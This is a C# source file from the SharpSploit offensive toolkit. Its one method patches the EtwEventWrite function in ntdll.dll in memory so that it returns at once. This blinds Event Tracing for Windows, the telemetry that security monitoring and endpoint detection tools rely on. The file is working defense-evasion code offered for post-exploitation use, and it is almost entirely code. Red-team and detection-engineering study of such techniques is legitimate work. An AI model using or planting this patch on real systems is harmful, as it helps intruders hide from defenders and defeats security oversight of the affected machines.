// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Runtime.InteropServices;
using SharpSploit.Misc;
using PInvoke = SharpSploit.Execution.PlatformInvoke;

namespace SharpSploit.Evasion
{

    /// <summary>
    /// ETW is a class for manipulating Event Tracing for Windows (ETW).
    /// </summary>
    public class ETW
    {
        /// <summary>
        /// Patch the EtwEventWrite function in ntdll.dll.
        /// </summary>
        /// <author>Simone Salucci & Daniel López @ NCC Group</author>
        /// <returns>Bool. True if succeeded, otherwise false.</returns>
        /// <remarks>
        /// Code has been adapted from Adam Chester (https://blog.xpnsec.com/hiding-your-dotnet-etw/) and Mythic Atlas (https://github.com/its-a-feature/Mythic/tree/master/Payload_Types/atlas).
        ///</remarks>
        public static bool PatchETWEventWrite()
        {
            byte[] patch;
            if (Utilities.Is64Bit)
            {
                patch = new byte[2];
                patch[0] = 0xc3;
                patch[1] = 0x00;
            }
            else
            {
                patch = new byte[3];
                patch[0] = 0xc2;
                patch[1] = 0x14;
                patch[2] = 0x00;
            }

            try
            {
                var library = PInvoke.Win32.Kernel32.LoadLibrary("ntdll.dll");
                var address = PInvoke.Win32.Kernel32.GetProcAddress(library, "EtwEventWrite");
                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
				PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
